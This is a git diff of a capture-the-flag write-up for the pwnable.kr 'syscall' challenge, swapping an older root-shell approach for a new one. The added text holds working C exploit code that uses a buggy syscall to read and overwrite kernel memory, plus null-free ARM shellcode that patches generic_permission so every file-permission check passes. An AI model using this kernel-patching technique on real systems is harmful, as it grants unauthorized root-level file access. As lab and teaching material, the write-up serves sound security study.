@@ -2,12 +2,12 @@
 
 Writeup for syscall challenge in pwnable.kr (200 points).
 
-## Background
-
+s## Background
+ 
 Syscall challenge is all about a syscall that someone added to the kernel that
 we need to exploit. 
 
-## Exploring the environment
+## Explore the enviroenment
 When we log in with ssh to `syscall@pwnable.kr` in port 2222 
 we are dropped into a VM,
 
@@ -24,11 +24,8 @@ to deliver my payload, and what flag should I read.
 
 by running `find / -name flag` I've found the file `/root/flag`.
 
-In order to deliver our binary payload we will encode it with base64 encoding,
-and use `payload | base64 --decode > executable` to decode it.
 
-
-## Exploring the syscall code
+## Inspecting the syscall code
 
 The given syscall is named `sys_upper` and its descriptor is 223.
 What it does is very simple:
@@ -77,157 +74,184 @@ in the operating system.
 I assume there are many ways to pwn this machine, but I'll choose 
 the one that seem the simplest to implement.
 
-First thing I did was looking into the syscall table of arm architecture in kernel version 3.11:
-https://github.com/torvalds/linux/blob/v3.11/arch/arm/kernel/calls.S
+I'll try to hook a function in the kernel so it will let me read the flag.
+After some research I've found the function `generic_permission`
 
+Here is how we're going to pull this one off:
 
-### Overriding the setuid syscall
-
-setuid syscall lets the user set it's user identity from within the process.
-This means a non-previleged user can change it's user id to 0 (== root), but'
-of course, it is not possible for all processes.
-
-This applies only to processes that has the capabilities to set uid.
-For more information about capabilities, explore the `man capabilities` page.
-
-In order to achieve the CAP_SETUID capability, the file on the filesystem needs
-to have the suid bit turned on. 
-
-BUT, what if we can patch the `sys_setuid` syscall to always allow the usage of 
-setuid even if suid bit is off.
-
-
-### Diving into the syscall implementation
-
-sys_setuid syscall implementation for kernel 3.11:
-https://github.com/torvalds/linux/blob/v3.11/kernel/sys.c (line 519)
-
-The part we target inside the syscall is the if statement that checks if 
-we have the CAP_SETUID capability.
-
-Here it is: 
-
-```C
-SYSCALL_DEFINE1(setuid, uid_t, uid)
-{
-    // -- snip --
-	if (nsown_capable(CAP_SETUID)) {
-		new->suid = new->uid = kuid;
-		if (!uid_eq(kuid, old->uid)) {
-			retval = set_user(new);
-			if (retval < 0)
-				goto error;
-		}
-	} else if (!uid_eq(kuid, old->uid) && !uid_eq(kuid, new->suid)) {
-		goto error;
-	}
-
-    // -- snip --
-}
+```mermaid
+flowchart LR
+	A[Find generic_permission address]
+	B[Patch it so it will permit everything]
+	C[cat /root/flag]
+	A --> B --> C
 ```
+### Overriding `generic_permission`
 
-`nsown_capable` seems to check if the current process has the given capability.
-Of course we can Confirm that by looking at the implementation of this function:
-https://github.com/torvalds/linux/blob/v3.11/kernel/capability.c (line 436)
+`generic_permission` used when reading files. When we use the read syscall from the UM, this function is called inside the kernel and checks whether the current user has the right permissions to read the desired file.
 
-```C
-/**
- * nsown_capable - Check superior capability to one's own user_ns
- * @cap: The capability in question
+Implementation from linux kernel 3.11 source code:
+
+```
+**
+ * generic_permission -  check for access rights on a Posix-like filesystem
+ * @inode:	inode to check access rights for
+ * @mask:	right to check for (%MAY_READ, %MAY_WRITE, %MAY_EXEC, ...)
  *
- * Return true if the current task has the given superior capability
- * targeted at its own user namespace.
+ * Used to check for read/write/execute permissions on a file.
+ * We use "fsuid" for this, letting us set arbitrary permissions
+ * for filesystem access without changing the "normal" uids which
+ * are used for other things.
+ *
+ * generic_permission is rcu-walk aware. It returns -ECHILD in case an rcu-walk
+ * request cannot be satisfied (eg. requires blocking or too much complexity).
+ * It would then be called again in ref-walk mode.
  */
-bool nsown_capable(int cap)
+int generic_permission(struct inode *inode, int mask)
 {
-	return ns_capable(current_user_ns(), cap);
+	// -- snip --
+	// Return negative value on error, return 0 if permitted...
+	// -- snip --
 }
 ```
 
+So if we manage to make this function return true all the time, we could just use 
+`cat /root/flag` 
+and it should work.
 
-What we can do is patch this function to always return **true**.
-This will grant all user-mode processes all the capabilities :).
 
-Once we have this method patched we can just run:
-```C
-setuid(0);
-execv("/bin/bash", {"/bin/bash", NULL});
-```
-
-and get a shell as root.
-
-## Crafting the payload
-
-### Findind `nsown_capable` address
-
-First we need to discover the address of `nsown_capable`.
-For that we'll use the `/boot/System.map` file which maps kernel
-symbols to addresses in memory.
+#### Finding the address
+In order to find the address we could make use of `/proc/kallsyms` which is basycally the kernel's symbol table.
 
 ```
-/boot $ less System.map | grep nsown_capable
-c00270f4 T nsown_capable
+/ $ cat /proc/kallsyms | grep generic_permission
+800c7d64 T generic_permission
+...
 ```
 
-**Address is:** `0xc00270f4`
-
-What we need to patch is nsown_capable:
-https://github.com/torvalds/linux/blob/v3.11/kernel/capability.c (line 442)
+So the address is  `0x800c7d64`, now let's patch this function!
 
 
-### Patching the payload without learning ARM
+#### Reading the function opcodes
+In order to patch the function, I need to inspect its compiled code. I can get it by setting up an entire kernel with qemu like in pwnable.kr VMs, but that will be a waste of time because I actually have read/write kernel memory vulnerability. let's just read it!
 
-In order to not waste my time on learning ARM, I decided to write a
-C code that contains a function that always return `true` with the same signature as `nsown_capable`,
+Here is a C code that uses the vulnerable syscall to read the function's content:
+```c
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <stdio.h>
+#include <string.h>
 
-Function implementation is in `return_true.c`:
+#define MAX 10000
 
-```C
-bool is_capable(uid_t uid) {
-    return true;
+int main() {
+    int counter = 0;
+    int upper_syscall_descriptor = 223;
+    // 800c7d64 T generic_permission
+    int input = 0x800c7d64;
+    char output[MAX];
+    memset(output, 0, MAX);
+    
+    // Read content
+    while (counter < 500) {
+        syscall(upper_syscall_descriptor, input + counter, output);
+
+        for (int i = 0; i < MAX && output[i] != 0; i++) {
+            printf("%02x ", output[i]);
+            counter++;
+        }
+
+        printf("00 ");
+    }
+    
 }
+
 ```
 
-Here is how to cross-compile C Code to ARM:
-https://askubuntu.com/questions/250696/how-to-cross-compile-for-arm
 
-
-After compiling the return_true.c code, Let's find the disassembled
-content of the `is_capable` function. I'll first find its address
-by using `readelf` command:
+now we can compile & run it on the remote machine and it will result the following:
 
 ```bash
-$ readelf -a return_true | grep is_capable
-  2762: 00010530    36 FUNC    GLOBAL DEFAULT    4 is_capable
+/tmp $ ls
+read.c
+/tmp $ gcc -std=c99 read.c -o read
+/tmp $ ./read
+f8 40 2d e9 0d 20 a0 e1 7f 3d c2 e3 04 20 90 e5 3f 30 c3 e3 b0 50 d0 e1 00 f8 40 2d e9 0d 20 a0 e1 7f 3d c2 e3 04 20 90 e5 3f 30 c3 e3 b0 50 d0 e1 00 27 53 a0 01 ...
 ```
 
-Address is `0x00010530`. Now I'll disassemble the binary by running:
-```bash
-arm-linux-gnueabi-objdump --disassemble return_true | less
-```
+Now if we disassemble it with [shellstorm](https://shell-storm.org/online/Online-Assembler-and-Disassembler/) we get:
+![disassembled](https://i.imgur.com/UsvJQ18.png)
 
-Searching for this address will give:
-
+As we can see, this is definately where the function starts because it pushes the registers with the following instruciton:
 
 ```
-00010530 <is_capable>:
-   10530:       e52db004        push    {fp}            ; (str fp, [sp, #-4]!)
-   10534:       e28db000        add     fp, sp, #0
-   10538:       e24dd00c        sub     sp, sp, #12
-   1053c:       e50b0008        str     r0, [fp, #-8]
-   10540:       e3a03001        mov     r3, #1
-   10544:       e1a00003        mov     r0, r3
-   10548:       e28bd000        add     sp, fp, #0
-   1054c:       e49db004        pop     {fp}            ; (ldr fp, [sp], #4)
-   10550:       e12fff1e        bx      lr
-```
-
-This is the disassembled ARM code behind the is_capable function.
-Here it is translated to opcodes only:
-```
-e52db004e28db000e24dd00ce50b0008e3a03001e1a00003e28bd000e49db004e12fff1e
+0x00000000800c7d64: F8 40 2D E9 push {r3, r4, r5, r6, r7, lr} 
+0x00000000800c7d68: 0D 20 A0 E1 ...
+0x00000000800c7d6c: 7F 3D C2 E3 ...
+0x00000000800c7d70: 04 20 90 E5 ...
 ```
 
 
-In order to patch the `nsown_capable` function we need to write this byte sequence
-to the function's location.
+#### Crafting the patch
+in arm assembly, function's return value is being put inside r0, so if we want this function to return zero we could just override the latter instructions with:
+
+```
+mov r0, #0
+pop {r3, r4, r5, r6, r7, pc}
+```
+
+(if you are not familiar with arm assembly, just read about the lr and pc registers).
+
+The issue with this assembly code that it assembles to blob that contains nullbytes (because both r0, and #0 are encoded to 0x00).
+
+So get over it we can just do
+
+```assembly
+subs r2, r2
+push {r2, r8}
+pop {r0, r8}
+pop {r3, r4, r5, r6, r7, pc}
+```
+
+which assembles to the following blob: 
+```plaintext
+"\x02\x20\x52\xe0\x04\x01\x2d\xe9\x01\x01\xbd\xe8\xf8\x80\xbd\xe8"
+```
+(compiled with [shellstorm](https://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=subs+r2%2C+r2%0D%0Apush+%7Br2%2C+r8%7D%0D%0Apop+%7Br0%2C+r8%7D%0D%0Apop+%7Br3%2C+r4%2C+r5%2C+r6%2C+r7%2C+pc%7D%0D%0A&arch=arm&as_format=inline#assembly) to arm)
+
+
+So now let's write it to the desired address (`0x800c7d68`, one instruction after the first instruction) and see if we can read the file.
+
+Here is C code that use our kernel memory WRITE capabiltiy to patch the kernel function.
+```c
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <stdio.h>
+#include <string.h>
+
+#define INPUT_SIZE 1024
+
+int main() {
+    int counter = 0;
+    int upper_syscall_descriptor = 223;
+    int output = 0x800c7d68;
+    char input[INPUT_SIZE] = "\x02\x20\x52\xe0\x04\x01\x2d\xe9\x01\x01\xbd\xe8\xf8\x80\xbd\xe8";
+
+    syscall(upper_syscall_descriptor, input, output);
+    printf("Kernel has been patched!");
+    system("cat /root/flag");
+}
+
+```
+
+
+
+## ~pwned
+```
+/tmp $ gcc -std=c99 patch.c -o patch
+/tmp $ ./patch
+Congratz!! addr_limit looks quite IMPORTANT now... huh?
+Kernel has been patched!/tmp $
+```
+
+
